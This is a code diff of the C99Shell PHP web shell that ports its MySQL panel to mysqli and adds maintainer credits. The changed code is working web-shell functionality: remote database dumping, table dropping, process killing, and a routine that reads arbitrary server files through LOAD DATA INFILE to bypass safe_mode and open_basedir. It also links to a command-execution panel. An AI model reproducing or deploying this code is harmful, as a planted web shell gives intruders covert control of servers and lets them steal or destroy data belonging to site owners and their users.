                             echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"" . htmlspecialchars($sql_db) . "\"><input type=\"hidden\" name=\"sql_login\" value=\"" . htmlspecialchars($sql_login) . "\"><input type=\"hidden\" name=\"sql_passwd\" value=\"" . htmlspecialchars($sql_passwd) . "\"><input type=\"hidden\" name=\"sql_server\" value=\"" . htmlspecialchars($sql_server) . "\"><input type=\"hidden\" name=\"sql_port\" value=\"" . htmlspecialchars($sql_port) . "\"><input type=\"hidden\" name=\"sql_tbl\" value=\"" . htmlspecialchars($sql_tbl) . "\"><b>SQL-Dump:</b><br><br>";
                             echo "<b>DB:</b>&nbsp;<input type=\"text\" name=\"sql_db\" value=\"" . urlencode($sql_db) . "\"><br><br>";
                             $v = join(";", $dmptbls);
@@ -2134,7 +2169,7 @@ if ($act != "img")
                             {
                                 $set["onlytabs"] = explode(";", $dmptbls);
                             }
-                            $ret = mysql_dump($set);
+                            $ret = mysqli_dump($set);
                             if ($sql_dump_download)
                             {
                                 @ob_clean();
@@ -2172,12 +2207,12 @@ if ($act != "img")
                             {
                                 $sql_tbl_act = "browse";
                             }
-                            $count = mysql_query("SELECT COUNT(*) FROM `" . $sql_tbl . "`;");
-                            $count_row = mysql_fetch_array($count);
-                            mysql_free_result($count);
-                            $tbl_struct_result = mysql_query("SHOW FIELDS FROM `" . $sql_tbl . "`;");
+                            $count = mysqli_query($sql_sock, "SELECT COUNT(*) FROM `" . $sql_tbl . "`;");
+                            $count_row = mysqli_fetch_array($count);
+                            mysqli_free_result($count);
+                            $tbl_struct_result = mysqli_query($sql_sock, "SHOW FIELDS FROM `" . $sql_tbl . "`;");
                             $tbl_struct_fields = array();
-                            while ($row = mysql_fetch_assoc($tbl_struct_result))
+                            while ($row = mysqli_fetch_assoc($tbl_struct_result))
                             {
                                 $tbl_struct_fields[] = $row;
                             }
@@ -2221,9 +2256,9 @@ if ($act != "img")
                                 $v = "";
                             }
                             $query = "SELECT * FROM `" . $sql_tbl . "` " . $v . "LIMIT " . $sql_tbl_ls . " , " . $perpage . "";
-                            $result = mysql_query($query) or print (mysql_smarterror());
-                            echo "<hr size=\"1\" noshade><center><b>Table " . htmlspecialchars($sql_tbl) . " (" . mysql_num_fields($result) . " cols and " . $count_row[0] . " rows)</b></center>";
-                            echo "<a href=\"" . $sql_surl . "sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_act=structure\">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
+                            $result = mysqli_query($sql_sock, $query) or print (mysqli_smarterror($sql_sock));
+                            echo "<hr size=\"1\" noshade><center><b>Table " . htmlspecialchars($sql_tbl) . " (" . mysqli_num_fields($result) . " cols and " . $count_row[0] . " rows)</b></center>";
+                            //echo "<a href=\"" . $sql_surl . "sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_act=structure\">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
                             echo "<a href=\"" . $sql_surl . "sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_act=browse\">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
                             echo "<a href=\"" . $sql_surl . "sql_tbl=" . urlencode($sql_tbl) . "&sql_act=tbldump&thistbl=1\">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
                             echo "<a href=\"" . $sql_surl . "sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_act=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
@@ -2242,15 +2277,15 @@ if ($act != "img")
                                 }
                                 else
                                 {
-                                    echo "<br><br><b>Inserting row into table:</b><br>";
+                                    echo "<hr size=\"1\" noshade><br><b>Inserting row into table:</b><br>";
                                     if (!empty($sql_tbl_insert_q))
                                     {
                                         $sql_query = "SELECT * FROM `" . $sql_tbl . "`";
                                         $sql_query .= " WHERE" . $sql_tbl_insert_q;
                                         $sql_query .= " LIMIT 1;";
-                                        $result = mysql_query($sql_query, $sql_sock) or print ("<br><br>" . mysql_smarterror());
-                                        $values = mysql_fetch_assoc($result);
-                                        mysql_free_result($result);
+                                        $result = mysqli_query($sql_sock, $sql_query) or print ("<br><br>" . mysqli_smarterror($sql_sock));
+                                        $values = mysqli_fetch_assoc($result);
+                                        mysqli_free_result($result);
                                     }
                                     else
                                     {
@@ -2317,9 +2352,9 @@ if ($act != "img")
                                 echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>";
                                 echo "<tr>";
                                 echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>";
-                                for ($i = 0;$i < mysql_num_fields($result);$i++)
+                                for ($i = 0;$i < mysqli_num_fields($result);$i++)
                                 {
-                                    $v = mysql_field_name($result, $i);
+                                    $v = mysqli_field_name($result, $i);
                                     if ($e[0] == "a")
                                     {
                                         $s = "d";
@@ -2347,14 +2382,14 @@ if ($act != "img")
                                 }
                                 echo "<td><font color=\"green\"><b>Action</b></font></td>";
                                 echo "</tr>";
-                                while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
+                                while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC))
                                 {
                                     echo "<tr>";
                                     $w = "";
                                     $i = 0;
                                     foreach ($row as $k => $v)
                                     {
-                                        $name = mysql_field_name($result, $i);
+                                        $name = mysqli_field_name($result, $i);
                                         $w .= " `" . $name . "` = '" . addslashes($v) . "' AND";
                                         $i++;
                                     }
@@ -2375,12 +2410,12 @@ if ($act != "img")
                                         $i++;
                                     }
                                     echo "<td>";
-                                    echo "<a href=\"" . $sql_surl . "sql_act=query&sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_ls=" . $sql_tbl_ls . "&sql_tbl_le=" . $sql_tbl_le . "&sql_query=" . urlencode("DELETE FROM `" . $sql_tbl . "` WHERE" . $w . " LIMIT 1;") . "\"><img src=\"" . $surl . "act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";
-                                    echo "<a href=\"" . $sql_surl . "sql_tbl_act=insert&sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_ls=" . $sql_tbl_ls . "&sql_tbl_le=" . $sql_tbl_le . "&sql_tbl_insert_q=" . urlencode($w) . "\"><img src=\"" . $surl . "act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";
+                                    echo "<a alt=\"Delete\" title=\"Delete\" href=\"" . $sql_surl . "sql_act=query&sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_ls=" . $sql_tbl_ls . "&sql_tbl_le=" . $sql_tbl_le . "&sql_query=" . urlencode("DELETE FROM `" . $sql_tbl . "` WHERE" . $w . " LIMIT 1;") . "\"><img src=\"" . $surl . "act=img&img=sql_button_drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";
+                                    echo "<a alt=\"Update\" title=\"Update\" href=\"" . $sql_surl . "sql_tbl_act=insert&sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_ls=" . $sql_tbl_ls . "&sql_tbl_le=" . $sql_tbl_le . "&sql_tbl_insert_q=" . urlencode($w) . "\"><img src=\"" . $surl . "act=img&img=change\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";
                                     echo "</td>";
                                     echo "</tr>";
                                 }
-                                mysql_free_result($result);
+                                mysqli_free_result($result);
                                 echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"" . $surl . "act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
                                 echo "<option value=\"\">With selected:</option>";
                                 echo "<option value=\"deleterow\">Delete</option>";
@@ -2389,17 +2424,17 @@ if ($act != "img")
                         }
                         else
                         {
-                            $result = mysql_query("SHOW TABLE STATUS", $sql_sock);
+                            $result = mysqli_query($sql_sock, "SHOW TABLE STATUS");
                             if (!$result)
                             {
-                                echo mysql_smarterror();
+                                echo mysqli_smarterror($sql_sock);
                             }
                             else
                             {
                                 echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";
                                 $i = 0;
                                 $tsize = $trows = 0;
-                                while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
+                                while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC))
                                 {
                                     $tsize += $row["Data_length"];
                                     $trows += $row["Rows"];
@@ -2412,7 +2447,7 @@ if ($act != "img")
                                     echo "<td>" . $row["Create_time"] . "</td>";
                                     echo "<td>" . $row["Update_time"] . "</td>";
                                     echo "<td>" . $size . "</td>";
-                                    echo "<td>&nbsp;<a href=\"" . $sql_surl . "sql_act=query&sql_query=" . urlencode("DELETE FROM `" . $row["Name"] . "`") . "\"><img src=\"" . $surl . "act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"" . $sql_surl . "sql_act=query&sql_query=" . urlencode("DROP TABLE `" . $row["Name"] . "`") . "\"><img src=\"" . $surl . "act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"" . $sql_surl . "sql_tbl_act=insert&sql_tbl=" . $row["Name"] . "\"><img src=\"" . $surl . "act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";
+                                    echo "<td>&nbsp;<a href=\"" . $sql_surl . "sql_act=query&sql_query=" . urlencode("DELETE FROM `" . $row["Name"] . "`") . "\"><img src=\"" . $surl . "act=img&img=sql_button_empty\" alt=\"Delete rows\" title=\"Delete rows\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"" . $sql_surl . "sql_act=query&sql_query=" . urlencode("DROP TABLE `" . $row["Name"] . "`") . "\"><img src=\"" . $surl . "act=img&img=sql_button_drop\" alt=\"Drop table\" title=\"Drop table\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"" . $sql_surl . "sql_tbl_act=insert&sql_tbl=" . $row["Name"] . "\"><img src=\"" . $surl . "act=img&img=sql_button_insert\" alt=\"Insert row\" title=\"Insert row\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";
                                     echo "</tr>";
                                     $i++;
                                 }
@@ -2436,7 +2471,7 @@ if ($act != "img")
                                 echo "<option value=\"tblrepair\">Repair table</option>";
                                 echo "<option value=\"tblanalyze\">Analyze table</option>";
                                 echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
-                                mysql_free_result($result);
+                                mysqli_free_result($result);
                             }
                         }
                     }
@@ -2458,88 +2493,92 @@ if ($act != "img")
                 if (!empty($sql_act))
                 {
                     echo "<hr size=\"1\" noshade>";
+                    if (($sql_act == "query") and (!$sql_db))
+                    {
+                        echo "<b>Query is not possible, you need to select a database</b></center>";
+                    }
                     if ($sql_act == "newdb")
                     {
                         echo "<b>";
-                        if ((mysql_create_db($sql_newdb)) and (!empty($sql_newdb)))
+                        if ((mysqli_create_db($sql_sock, $sql_newdb)) and (!empty($sql_newdb)))
                         {
                             echo "DB \"" . htmlspecialchars($sql_newdb) . "\" has been created with success!</b><br>";
                         }
                         else
                         {
-                            echo "Can't create DB \"" . htmlspecialchars($sql_newdb) . "\".<br>Reason:</b> " . mysql_smarterror();
+                            echo "Can't create DB \"" . htmlspecialchars($sql_newdb) . "\".<br>Reason:</b> " . mysqli_smarterror($sql_sock);
                         }
                     }
                     if ($sql_act == "serverstatus")
                     {
-                        $result = mysql_query("SHOW STATUS", $sql_sock);
+                        $result = mysqli_query($sql_sock, "SHOW STATUS");
                         echo "<center><b>Server-status variables:</b><br><br>";
                         echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
-                        while ($row = mysql_fetch_array($result, MYSQL_NUM))
+                        while ($row = mysqli_fetch_array($result, MYSQLI_NUM))
                         {
                             echo "<tr><td>" . $row[0] . "</td><td>" . $row[1] . "</td></tr>";
                         }
                         echo "</table></center>";
-                        mysql_free_result($result);
+                        mysqli_free_result($result);
                     }
                     if ($sql_act == "servervars")
                     {
-                        $result = mysql_query("SHOW VARIABLES", $sql_sock);
+                        $result = mysqli_query($sql_sock, "SHOW VARIABLES");
                         echo "<center><b>Server variables:</b><br><br>";
                         echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
-                        while ($row = mysql_fetch_array($result, MYSQL_NUM))
+                        while ($row = mysqli_fetch_array($result, MYSQLI_NUM))
                         {
                             echo "<tr><td>" . $row[0] . "</td><td>" . $row[1] . "</td></tr>";
                         }
                         echo "</table>";
-                        mysql_free_result($result);
+                        mysqli_free_result($result);
                     }
                     if ($sql_act == "processes")
                     {
                         if (!empty($kill))
                         {
                             $query = "KILL " . $kill . ";";
-                            $result = mysql_query($query, $sql_sock);
+                            $result = mysqli_query($sql_sock, $query);
                             echo "<b>Killing process #" . $kill . "... ok. he is dead, amen.</b>";
                         }
-                        $result = mysql_query("SHOW PROCESSLIST", $sql_sock);
+                        $result = mysqli_query($sql_sock, "SHOW PROCESSLIST");
                         echo "<center><b>Processes:</b><br><br>";
                         echo "<TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
-                        while ($row = mysql_fetch_array($result, MYSQL_NUM))
+                        while ($row = mysqli_fetch_array($result, MYSQLI_NUM))
                         {
                             echo "<tr><td>" . $row[0] . "</td><td>" . $row[1] . "</td><td>" . $row[2] . "</td><td>" . $row[3] . "</td><td>" . $row[4] . "</td><td>" . $row[5] . "</td><td>" . $row[6] . "</td><td>" . $row[7] . "</td><td><a href=\"" . $sql_surl . "sql_act=processes&kill=" . $row[0] . "\"><u>Kill</u></a></td></tr>";
                         }
                         echo "</table>";
-                        mysql_free_result($result);
+                        mysqli_free_result($result);
                     }
                     if ($sql_act == "getfile")
                     {
                         $tmpdb = $sql_login . "_tmpdb";
-                        $select = mysql_select_db($tmpdb);
+                        $select = mysqli_select_db($sql_sock, $tmpdb);
                         if (!$select)
                         {
-                            mysql_create_db($tmpdb);
-                            $select = mysql_select_db($tmpdb);
+                            mysqli_create_db($sql_sock, $tmpdb);
+                            $select = mysqli_select_db($sql_sock, $tmpdb);
                             $created = !!$select;
                         }
                         if ($select)
                         {
                             $created = false;
-                            mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
-                            mysql_query("LOAD DATA INFILE \"" . addslashes($sql_getfile) . "\" INTO TABLE tmp_file");
-                            $result = mysql_query("SELECT * FROM tmp_file;");
+                            mysqli_query($sql_sock, "CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
+                            mysqli_query($sql_sock, "LOAD DATA INFILE \"" . addslashes($sql_getfile) . "\" INTO TABLE tmp_file");
+                            $result = mysqli_query($sql_sock, "SELECT * FROM tmp_file;");
                             if (!$result)
                             {
                                 echo "<b>Error in reading file (permision denied)!</b>";
                             }
                             else
                             {
-                                for ($i = 0;$i < mysql_num_fields($result);$i++)
+                                for ($i = 0;$i < mysqli_num_fields($result);$i++)
                                 {
-                                    $name = mysql_field_name($result, $i);
+                                    $name = mysqli_field_name($result, $i);
                                 }
                                 $f = "";
-                                while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
+                                while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC))
                                 {
                                     $f .= join("\r\n", $row);
                                 }
@@ -2551,11 +2590,11 @@ if ($act != "img")
                                 {
                                     echo "<b>File \"" . $sql_getfile . "\":</b><br>" . nl2br(htmlspecialchars($f)) . "<br>";
                                 }
-                                mysql_free_result($result);
-                                mysql_query("DROP TABLE tmp_file;");
+                                mysqli_free_result($result);
+                                mysqli_query($sql_sock, "DROP TABLE tmp_file;");
                             }
                         }
-                        mysql_drop_db($tmpdb);
+                        mysqli_drop_db($sql_sock, $tmpdb);
                     }
                 }
             }
@@ -2563,7 +2602,7 @@ if ($act != "img")
         echo "</td></tr></table>";
         if ($sql_sock)
         {
-            $affected = @mysql_affected_rows($sql_sock);
+            $affected = @mysqli_affected_rows($sql_sock);
             if ((!is_numeric($affected)) or ($affected < 0))
             {
                 $affected = 0;
@@ -4928,7 +4967,7 @@ else
 }
 if ($act == "about")
 {
-    echo "<center><b>Credits:<br><br>Kudos to the &quot;Original Creators&quot; of C99Shell.<br><br>and <u>KaizenLouie</u> for Latest safe-build and update for PHP 7.<br><br>Thanks to all who reported the bugs.<br>If there are more bugs, please create an issue in https://github.com/KaizenLouie/C99Shell-PHP7 </b>";
+    echo "<center><b>Credits:<br><br>Kudos to the &quot;Original Creators&quot; of C99Shell,<br><br><u>KaizenLouie</u> for Latest safe-build and update for PHP 7, and <u>cermmik</u> for MySQL support.<br><br>Thanks to all who reported the bugs.<br>If there are more bugs, please create an issue in https://github.com/KaizenLouie/C99Shell-PHP7<br>for MySQL-related bugs create an issue in https://github.com/cermmik/C99-Shell </b>";
 } ?>
 </td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
 <tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Command execute</b></a> ::</b></p></td></tr>
@@ -4945,7 +4984,7 @@ if ($act == "about")
 </table>
 <br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Make Dir ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Make File ::</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td></tr></table>
 <br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
-<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>maintained by</b></u></a> KaizenLouie | <a href="https://github.com/KaizenLouie/C99Shell-PHP7"><font color="#FF0000">C99Shell Github</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime() - starttime, 4); ?> ]--</b></p></td></tr></table>
+<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v.<?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>maintained by</b></u></a> KaizenLouie and <a href="<?php echo $surl; ?>act=about"><u><b>updated by</b></u></a> cermmik | <a href="https://github.com/KaizenLouie/C99Shell-PHP7"><font color="#FF0000">C99Shell Github</font></a><font color="#FF0000"></font> (<a href="https://github.com/cermmik/C99-Shell">MySQL update</a>) | Generation time: <?php echo round(getmicrotime() - starttime, 4); ?> ]--</b></p></td></tr></table>
 </body></html><?php chdir($lastdir);
 
 c99shexit(); 
